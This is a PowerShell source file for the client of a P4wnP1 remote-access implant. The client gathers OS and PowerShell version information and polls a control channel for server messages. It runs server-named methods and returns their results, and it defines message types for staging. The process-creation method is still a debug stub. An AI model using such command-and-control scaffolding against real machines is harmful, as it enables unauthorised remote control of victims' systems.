﻿##################
# Client implementation
####################

$clientclass = New-Object psobject -Property @{
    _tl = $null
    os_info = $null
    ps_version = $null
    running = $true
    pending_method_calls = $null
    CTRL_MSG_CLIENT_RESERVED = 0
    CTRL_MSG_CLIENT_REQ_STAGE2 = 1
    CTRL_MSG_CLIENT_RCVD_STAGE2 = 2
    CTRL_MSG_CLIENT_STAGE2_RUNNING = 3
    CTRL_MSG_CLIENT_RUN_METHOD_RESPONSE = 4

    # from server
    CTRL_MSG_SERVER_SEND_OS_INFO = 1001
    CTRL_MSG_SERVER_SEND_PS_VERSION = 1002
    CTRL_MSG_SERVER_RUN_METHOD = 1003
}

#$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "SendData" -Value {
#    param(
#          [Parameter(Mandatory=$true)]
#          [uint32]$channel,
#
#          [Parameter(Mandatory=$true)]
#          [Byte[]]$data
#    )
#
#    $CH = [BitConverter]::GetBytes([uint32]$channel)
#    # account for endianess (Convert to network order)
#    if ([System.BitConverter]::IsLittleEndian) {
#        [array]::Reverse($CH) # not needed as this is zero
#    }
#    $this._ll.PushOutputStream($CH + $data)
#}

$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "SendControlMessage" -Value {
    param(
          [Parameter(Mandatory=$true)]
          [uint32]$msg_type, # type of control message

          [Parameter(Mandatory=$false)]
          [Byte[]]$data
    )

    
    $MT = [BitConverter]::GetBytes([uint32]$msg_type) # TYPE of control message
    # account for endianess (Convert to network order)
    if ([System.BitConverter]::IsLittleEndian) {
        [array]::Reverse($MT)
    }

    if ($data) {
        #$this.SendData(0, $MT + $data)
        $this._tl.write_control_channel([Byte[]] ($MT + $data))
    } else {
        #$this.SendData(0, $MT)
        $this._tl.write_control_channel([Byte[]] ($MT))
    }
}

$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "CreateProcess" -Value {
    param(
          [Parameter(Mandatory=$true)]
          [String]$cmd_line, # Commandline

          [Parameter(Mandatory=$true)]
          [uint32]$proc_id # P4wnP1 internal ID to identify this process (generated by server)
    )

    $Host.UI.WriteLine("Generating proc with ID {0} for cmdline '{1}'" -f ($proc_id, $cmd_line))


    #######
    # error handling test by returning wrong values
    #######

    #return "bli bla blubb"
    return [Byte[]] (1,3,3,7)
}

$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "core_echo" -Value {
    param(
          [Parameter(Mandatory=$true)]
          #[Byte[]]
          $args
          
    )

    $Host.UI.WriteLine("core_echo called")


    #######
    # error handling test by returning wrong values
    #######

    #return "bli bla blubb"
    return $args
}

$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "run" -Value {
    $host.UI.WriteLine("Client started")

    # process inbound data
    while ($this.running)
    {
        #$this._tl.ProcessInSingle($true) # single input loop iteration, blocks till data is received
         $this._tl.ProcessInSingle() # process input non-blocking, as this is full speed polling CPU load will raise

        # check if we have data for control channel
        $ctrl_ch = $this._tl.GetChannel(0)
        while ($ctrl_ch.hasPendingInData())
        {
            # receive control message
            $ctrl_data = $ctrl_ch.read()

            # extract control message MESSAGE TYPE
            $MT, $ctrl_data = $structclass.extractUInt32($ctrl_data)
            
            switch ($MT)
            {
                $clientclass.CTRL_MSG_SERVER_RUN_METHOD
                {
                    # create method object and add to pending method calls
                    $method = MethodFromRequest -request $ctrl_data

                    $this.pending_method_calls.([String]$method.id) = $method

                    # print for debug
                    $Host.UI.WriteLine("Received control message RUN_METHOD! Method ID: {0}, Method Name: {1}, Method Args: {2}" -f ($method.id, $method.name, "$method.args"))
                }
                
                default
                {
                    $data_utf8 = [System.Text.Encoding]::UTF8.GetString($ctrl_data, 0, $ctrl_data.Length)
                    $Host.UI.WriteLine("Received unknown MESSAGE TYPE for control channel! MessageType: {0}, Data: {1}" -f ($MT, $data_utf8))
                }   
            }

            

            
        }
        
        #########
        # ToDo : process remainin input channels
        ##################

        ####
        # Process pending method calls (as we want to delete 'methods' during iteration, the KeyCollection is cloned to an array first)
        #####
        $method_ids = [String[]] $this.pending_method_calls.Keys # conversion needs to be tested on Win7

        foreach ($key in $method_ids)
        {
            # fetch method
            if ($this.pending_method_calls.ContainsKey($key))
            {
                $method = $client.pending_method_calls.Item($key)

                # check if method has been started
                if (-not $method.started)
                {
                    # start method
                    # ToDo: if method should be runned asny, dispatch to another thread, for now its up to the method implementation to do this
                    $name = $method.name

                    # fetch real method
                    $method_implemenation = $this.($name)

                    # check if real method has been found
                    if ($method_implemenation)
                    {
                        # run method
                        #$res = $method_implemenation.Invoke((,$method.args))
                        $res = $method_implemenation.Invoke((0, $method.args)) # for some reason the first element of the args array isn't passed in, thus it is set to 0 here

                        # put result and mark as finished (error if the result is wrong type)
                        try
                        {
                            $method.setResult($res) 
                        }
                        catch [System.Management.Automation.MethodInvocationException]
                        {
                            # wrong return type or return of $null should be fetched here
                            $errstr = "Method '{0}' found, but calling results in following error:`n {1}" -f ($name, $_.Exception.Message)
                            
                            # put error to method object
                            $method.setError($errstr) # this finishes method execution
                        }
                        catch [System.Management.Automation.RuntimeException]
                        {
                            $errstr = "Method '{0}' found, but calling results in following error:`n {1}" -f ($name, $_.Exception.Message)
                            
                            # put error to method object
                            $method.setError($errstr) # this finishes method execution
                        }
                    }
                    else
                    {
                        $errstr = "Method {0} not found" -f $name

                        # put error 
                        $method.setError($errstr) # this finishes method execution

                        
                    }
                }

                if ($method.finished)
                {
                    
                    # send back result / error
                    $response = $method.createResponse()
                    $this.SendControlMessage($clientclass.CTRL_MSG_CLIENT_RUN_METHOD_RESPONSE, $response)



                    # remove from pending queue
                    $this.pending_method_calls.Remove($key)
                    
                }
            }
        }

        $this._tl.ProcessOutSingle() # single input loop iteration, blocks till data is received

    }

    $host.UI.WriteLine("Client stopped")
}

$clientclass | Add-Member -Force -MemberType ScriptMethod -Name "stop" -Value {
    $this.running = $false
}

function Client {
    param(
          [Parameter(Mandatory=$true)]
          [PSCustomObject]$TransportLayer

    )
    
    $client = $clientclass.psobject.Copy()

    # initial values
    $client._tl = $TransportLayer
    $client.pending_method_calls = @{}
    $client.ps_version = $Host.Version.ToString()
    $client.os_info = Get-WmiObject -class Win32_OperatingSystem | Select-Object Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BuildNumber, CSName | Out-String
    return $client
}



##################
# Client implementation
####################